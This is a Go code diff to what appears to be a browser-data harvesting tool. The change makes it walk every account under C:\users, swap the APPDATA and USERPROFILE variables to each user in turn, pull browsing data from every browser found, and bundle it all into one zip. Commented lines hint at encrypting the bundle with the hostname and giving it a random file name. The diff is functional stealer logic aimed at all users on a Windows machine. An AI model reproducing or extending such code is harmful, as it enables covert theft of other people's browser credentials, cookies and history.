@@ -3,13 +3,13 @@ package run
 import (
     "archive/zip"
     "bytes"
-    "encoding/hex"
     "fmt"
     "github.com/urfave/cli/v2"
     "os"
     "tests/browser"
     "tests/log"
     "tests/utils/fileutil"
+    "tests/utils/stringutil"
     "time"
 )
 
@@ -58,56 +58,69 @@ func Execute() {
                 profilePath = LibProfilePath
                 browserName = LibBrowserName
             }
-
-            var masterKeyBytes []byte
-            if MasterKey != "" {
-                var err error
-                masterKeyBytes, err = hex.DecodeString(MasterKey)
-                if err != nil {
-                    log.Error(err.Error())
-                    return err
-                }
-                log.LogInfo("set master key")
-            }
-            oldAppdata := ""
-            oldUserProfile := ""
-            if Username != "" {
-                oldAppdata = os.Getenv("APPDATA")
-                oldUserProfile = os.Getenv("USERPROFILE")
-
-                os.Setenv("APPDATA", fmt.Sprintf(`C:\Users\%s\AppData\Roaming`, Username))
-                os.Setenv("USERPROFILE", fmt.Sprintf(`C:\Users\%s`, Username))
-                log.LogInfo("set user profile and appdata for " + Username)
-                time.Sleep(time.Second)
-                browser.RefreshConfig()
-            }
-
-            browsers, err := browser.PickBrowsers(browserName, profilePath)
+            usernames := make([]string, 0)
+            userNameWhiteList := []string{"default", "public"}
+            entries, err := os.ReadDir(`c:\users`)
             if err != nil {
-                log.LogErr(fmt.Sprintf("pick browsers error: %s", err.Error()))
-                log.Errorf("pick browsers %v", err)
                 return err
-            } else {
-                log.LogSuccess("PickBrowsers success")
             }
-            time.Sleep(time.Second)
+        dirLoop:
+            for _, entry := range entries {
+                if !entry.IsDir() {
+                    continue
+                }
+                for _, white := range userNameWhiteList {
+                    if stringutil.CompareIgnoreCase(white, entry.Name()) {
+                        continue dirLoop
+                    }
+                }
+                usernames = append(usernames, entry.Name())
+            }
+
+            oldAppdata := os.Getenv("APPDATA")
+            oldUserProfile := os.Getenv("USERPROFILE")
 
             outBuffer := bytes.Buffer{}
             zw := zip.NewWriter(&outBuffer)
-            for _, b := range browsers {
-                log.LogSuccess(fmt.Sprintf("get browsing %s data", b.Name()))
 
-                data, err := b.BrowsingData(isFullExport, masterKeyBytes)
+            for _, username := range usernames {
+                os.Setenv("APPDATA", fmt.Sprintf(`C:\Users\%s\AppData\Roaming`, username))
+                os.Setenv("USERPROFILE", fmt.Sprintf(`C:\Users\%s`, username))
+                log.LogInfo(fmt.Sprintf("set user profile and appdata for [%s]", username))
+                time.Sleep(time.Second)
+                browser.RefreshConfig()
+
+                //if stringutil.CompareIgnoreCase(username, "administrator") && Username != ""{
+                //    username
+                //}
+
+                browsers, err := browser.PickBrowsers(browserName, profilePath)
                 if err != nil {
-                    log.LogErr(fmt.Sprintf("get browsing data error: %s", err.Error()))
-                    log.Errorf("get browsing data error %v", err)
+                    log.LogErr(fmt.Sprintf("pick [%s] browsers error: %s", username, err.Error()))
+                    log.Errorf("pick [%s] browsers %v", username, err)
                     continue
+                } else {
+                    log.LogSuccess(fmt.Sprintf("[%s] PickBrowsers success", username))
                 }
-                data.Output(zw, outputDir, b.Name(), outputFormat)
+                time.Sleep(time.Second)
+
+                for _, b := range browsers {
+                    log.LogSuccess(fmt.Sprintf("get [%s] browsing %s data", username, b.Name()))
+                    data, err := b.BrowsingData(isFullExport, username)
+                    if err != nil {
+                        log.LogErr(fmt.Sprintf("get [%s] browsing data error: %s", username, err.Error()))
+                        log.Errorf("get [%s] browsing data error %v", username, err)
+                        continue
+                    }
+                    data.Output(zw, username, b.Name(), outputFormat)
+                }
             }
             zw.Close()
             log.LogInfo("over collect data")
 
+            os.Setenv("APPDATA", oldAppdata)
+            os.Setenv("USERPROFILE", oldUserProfile)
+            log.LogInfo("recovery user profile and appdata")
             //host, _ := os.Hostname()
             //out := crypto.AESEncrypt(outBuffer.Bytes(), []byte(host))
             //outName := uuid.New().String()
@@ -116,12 +129,6 @@ func Execute() {
             log.LogBytes(b, len(b))
 
             log.LogSuccess("recv browser data success")
-
-            if Username != "" {
-                os.Setenv("APPDATA", oldAppdata)
-                os.Setenv("USERPROFILE", oldUserProfile)
-                log.LogInfo("recovery user profile and appdata")
-            }
 
             time.Sleep(time.Second * 5)
 
@@ -139,7 +146,7 @@ func Execute() {
             //}
 
             if compress {
-                if err = fileutil.CompressDir(outputDir); err != nil {
+                if err := fileutil.CompressDir(outputDir); err != nil {
                     log.Errorf("compress error %v", err)
                 }
                 log.Debug("compress success")
